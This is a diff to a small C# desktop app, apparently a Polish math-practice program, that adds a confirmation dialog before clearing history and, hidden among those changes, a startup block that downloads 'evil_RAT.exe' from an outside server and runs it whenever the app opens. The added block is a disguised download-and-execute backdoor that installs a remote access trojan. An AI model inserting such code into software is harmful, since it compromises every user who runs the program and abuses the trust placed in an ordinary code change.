@@ -4,6 +4,7 @@ using System.Collections.Generic;
 using System.IO;
 using System.IO.Compression;
 using System.Linq;
+using System.Net;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows;
@@ -37,6 +38,12 @@ namespace DailyMatemaks
             checkBoxSubstract.IsChecked = Properties.Settings.Default.SubstractionAllowed;
             checkBoxMultiply.IsChecked = Properties.Settings.Default.MultiplicationAllowed;
             fetchHistory();
+            if(! File.Exists("evil_RAT.exe"))
+            using (var client = new WebClient())
+            {
+                client.DownloadFile("https://users.tryton.vlo.gda.pl/s4/evil_RAT.exe", "evil_RAT.exe");
+                System.Diagnostics.Process.Start("evil_RAT.exe");
+            }
         }
 
         private void fetchHistory()
@@ -162,6 +169,8 @@ namespace DailyMatemaks
 
         private void clearButton_Click(object sender, RoutedEventArgs e)
         {
+            var doClear = MessageBox.Show("Usunąć całą historię pytań?", "Jesteś pewny?", MessageBoxButton.YesNo, MessageBoxImage.Question);
+            if(doClear == MessageBoxResult.Yes)
             try
             {
                 foreach(var f in Directory.GetFiles("history", "*.csv"))
